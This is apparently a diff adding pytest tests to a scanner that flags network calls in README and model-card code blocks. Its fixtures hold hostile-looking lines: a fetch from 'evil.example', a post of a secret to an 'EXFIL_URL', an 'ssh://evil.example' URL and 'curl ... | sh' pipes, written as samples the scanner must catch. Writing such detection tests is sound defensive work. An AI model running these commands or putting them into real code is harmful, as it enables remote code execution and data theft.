@@ -396,6 +396,43 @@ image = Image.open(requests.get("http://images.cocodataset.org/val2017/000000039
     assert determine_exit_code(aggregate) == 0
 
 
+@pytest.mark.parametrize(
+    "media_url",
+    [
+        "https://user:pass@example.com/image.jpg",
+        "https://example.com/image.jpg?api_key=secret",
+    ],
+)
+def test_text_scanner_fenced_documentation_passive_media_rejects_sensitive_urls(
+    tmp_path: Path,
+    media_url: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        f"""```python
+from PIL import Image
+import requests
+
+url = "{media_url}"
+image = Image.open(requests.get(url, stream=True).raw)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 def test_text_scanner_fenced_documentation_passive_media_does_not_hide_active_call(tmp_path: Path) -> None:
     text_path = tmp_path / "README.md"
     text_path.write_text(
@@ -418,6 +455,35 @@ requests.get("https://evil.example/payload")
         and check.details.get("type") == "network_function"
         and check.details.get("function") == "requests.get"
         and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_non_http_url(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+payload = "ssh://evil.example/x"
+requests.get(url, stream=True)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "ssh://evil.example/x"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
     assert determine_exit_code(aggregate) == 1
@@ -475,6 +541,36 @@ requests.post(os.environ["EXFIL_URL"], data=secret)
         check.name == "Network Communication Detection"
         and check.details.get("type") == "network_function"
         and check.details.get("function") == "requests.post"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_fenced_documentation_passive_media_does_not_hide_mutated_target(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```python
+import os
+import requests
+
+url = "http://images.cocodataset.org/val2017/000000039769.jpg"
+url += os.environ["EXFIL_PATH"]
+requests.get(url, stream=True)
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
         and check.severity == IssueSeverity.CRITICAL
         for check in result.checks
     )
@@ -1064,6 +1160,98 @@ curl https://download.pytorch.org/whl/cu128 | sh
         check.name == "Network Communication Detection"
         and check.details.get("type") == "url_detected"
         and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    ("model_revision", "content", "expected_url"),
+    [
+        (
+            "google/gemma-4-E2B-it-qat-q4_0-gguf@1894d1fc0a19d86697abd40483f5983c867df03f",
+            (
+                "---\n"
+                "license_link: https://ai.google.dev/gemma/docs/gemma_4_license\n"
+                "---\n\n"
+                "<img src=https://ai.google.dev/gemma/images/gemma4_banner.png>\n"
+                '<a href="https://github.com/google-gemma">GitHub</a>\n'
+                '<a href="https://huggingface.co/collections/google/gemma-4">Hugging Face</a>\n'
+                '<a href="https://ai.google.dev/gemma/docs/core">Documentation</a>\n'
+            ),
+            "https://ai.google.dev/gemma/docs/gemma_4_license",
+        ),
+        (
+            "google-bert/bert-base-cased@cd5ef92a9fb2f889e972770a36d4ed042daf221e",
+            (
+                "BERT is described in [this paper](https://arxiv.org/abs/1810.04805) and "
+                "[this repository](https://github.com/google-research/bert).\n\n"
+                "```bibtex\n"
+                "  url       = {http://arxiv.org/abs/1810.04805},\n"
+                "  biburl    = {https://dblp.org/rec/journals/corr/abs-1810-04805.bib},\n"
+                "  bibsource = {dblp computer science bibliography, https://dblp.org}\n"
+                "```\n"
+                '<img width="300px" src="https://cdn-media.huggingface.co/exbert/button.png">\n'
+            ),
+            "http://arxiv.org/abs/1810.04805",
+        ),
+    ],
+)
+def test_text_scanner_pinned_model_card_reference_urls_are_informational(
+    tmp_path: Path,
+    model_revision: str,
+    content: str,
+    expected_url: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f"{content}\n<!-- {model_revision} -->\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == expected_url
+        and check.severity == IssueSeverity.INFO
+        for check in result.checks
+    )
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    ("fence_language", "content", "expected_url"),
+    [
+        (
+            "bash",
+            "curl https://ai.google.dev/gemma/docs/gemma_4_license | sh\n",
+            "https://ai.google.dev/gemma/docs/gemma_4_license",
+        ),
+        (
+            "python",
+            'requests.get("http://arxiv.org/abs/1810.04805")\n',
+            "http://arxiv.org/abs/1810.04805",
+        ),
+    ],
+)
+def test_text_scanner_pinned_model_card_reference_urls_executable_context_remains_actionable(
+    tmp_path: Path,
+    fence_language: str,
+    content: str,
+    expected_url: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f"```{fence_language}\n{content}```\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == expected_url
         and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
         for check in result.checks
     )
